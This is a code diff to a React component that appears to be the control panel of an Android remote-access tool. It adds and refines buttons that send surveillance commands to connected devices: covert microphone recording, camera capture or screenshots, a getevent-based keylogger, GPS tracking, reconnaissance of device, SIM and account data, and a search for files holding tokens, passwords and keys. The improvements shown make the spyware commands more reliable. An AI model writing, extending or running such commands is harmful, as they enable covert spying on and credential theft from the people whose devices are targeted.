@@ -476,7 +476,8 @@ export default function Agents({ onOpenTerminal }: Props) {
                               className="w-full flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/40 text-[11px] text-muted">
                               ⬆ ..
                             </button>
-                            {fsData[a.id].files.map(f => (
+                            {/* Filter out . and .. directory references from OS */}
+                            {fsData[a.id].files.filter(f => f.name !== '.' && f.name !== '..').map(f => (
                               <div key={f.name}
                                 className="flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/20 group text-[11px]">
                                 <span>{f.is_dir ? '📁' : '📄'}</span>
@@ -596,15 +597,15 @@ export default function Agents({ onOpenTerminal }: Props) {
                     {activeTab === 'specops' && isAndroid && (
                       <div className="grid grid-cols-2 sm:grid-cols-3 gap-1.5">
                         {[
-                          { icon:'🎤', l:'Audio Capture', c:"termux-microphone-record -l 15 -f /sdcard/Download/audio_$(date +%s).m4a 2>/dev/null && echo saved || echo needs-termux-api" },
-                          { icon:'📸', l:'Camera/Screen',  c:"termux-camera-photo /sdcard/Download/photo_$(date +%s).jpg 2>/dev/null && echo saved || screencap -p /sdcard/Download/ss_$(date +%s).png 2>/dev/null && echo saved || echo needs-root-or-termuxapi" },
-                          { icon:'🔑', l:'Keylogger',      c:"getevent -l 2>/dev/null | grep KEY | head -30 || echo needs-root" },
-                          { icon:'📍', l:'GPS Location',   c:"termux-location 2>/dev/null || dumpsys location 2>/dev/null | grep 'Last Known' | head -5" },
-                          { icon:'💾', l:'Full Recon',     c:"echo '=DEVICE=' && getprop ro.product.model && getprop ro.build.version.release && echo '=NETWORK=' && ip addr show | grep 'inet ' && echo '=ACCOUNTS=' && dumpsys account 2>/dev/null | grep 'Account {' | head -8" },
-                          { icon:'🗄️', l:'Cred Files',    c:"find /sdcard -name '*.json' -o -name '*.db' -o -name '*.conf' 2>/dev/null | grep -iE 'auth|token|cred|pass|key' | head -20" },
+                          { icon:'🎤', l:'Audio (15s)',    c:"command -v termux-microphone-record >/dev/null 2>&1 && termux-microphone-record -l 15 -f /sdcard/Download/audio_$(date +%s).m4a && echo '[+] Saved to /sdcard/Download/' || echo '[!] Install Termux:API from F-Droid then run: pkg install termux-api'" },
+                          { icon:'📸', l:'Camera/Screen',  c:"command -v termux-camera-photo >/dev/null 2>&1 && termux-camera-photo /sdcard/Download/photo_$(date +%s).jpg && echo '[+] Photo saved' || (screencap -p /sdcard/Download/ss_$(date +%s).png 2>/dev/null && echo '[+] Screenshot saved to /sdcard/Download/') || echo '[!] Install Termux:API: pkg install termux-api'" },
+                          { icon:'📍', l:'GPS Location',   c:"command -v termux-location >/dev/null 2>&1 && termux-location --provider gps 2>/dev/null || (echo '[Network location:]' && dumpsys location 2>/dev/null | grep -E 'mLastLocation|Last Known|Latitude|Longitude|lat=|lng=' | head -10) || echo '[!] Install Termux:API: pkg install termux-api'" },
+                          { icon:'🔑', l:'Keylogger',      c:"getevent -l 2>/dev/null | grep KEY | head -50 || cat /proc/bus/input/devices 2>/dev/null | head -30 || echo '[!] Root required for hardware keylogger. Check ~/.bash_history for typed commands'" },
+                          { icon:'💾', l:'Full Recon',     c:"echo '[DEVICE]' && getprop ro.product.model && getprop ro.product.manufacturer && getprop ro.build.version.release && echo '[NETWORK]' && ip addr show | grep 'inet ' && getprop net.dns1 && echo '[SIM]' && getprop gsm.operator.alpha && getprop gsm.network.type && echo '[ACCOUNTS]' && dumpsys account 2>/dev/null | grep 'Account {' | head -8 && echo '[STORAGE]' && df -h /sdcard /data 2>/dev/null" },
+                          { icon:'🗄️', l:'Cred Files',    c:"echo '[Config files with credentials:]' && find /sdcard /data/data/com.termux -name '*.json' -o -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null | grep -iE 'auth|token|cred|pass|key|secret|api' | head -25" },
                         ].map(q => (
                           <button key={q.l} onClick={() => execSession(a.id, q.c, q.l)} disabled={isExec}
-                            className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-bg hover:border-[#ff4444]/50 hover:bg-[#ff4444]/5 transition-colors disabled:opacity-40 text-left">
+                            className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-bg hover:border-danger/30 hover:bg-danger/5 transition-colors disabled:opacity-40 text-left">
                             <span className="text-base">{q.icon}</span>
                             <span className="text-[10px] text-muted">{q.l}</span>
                           </button>
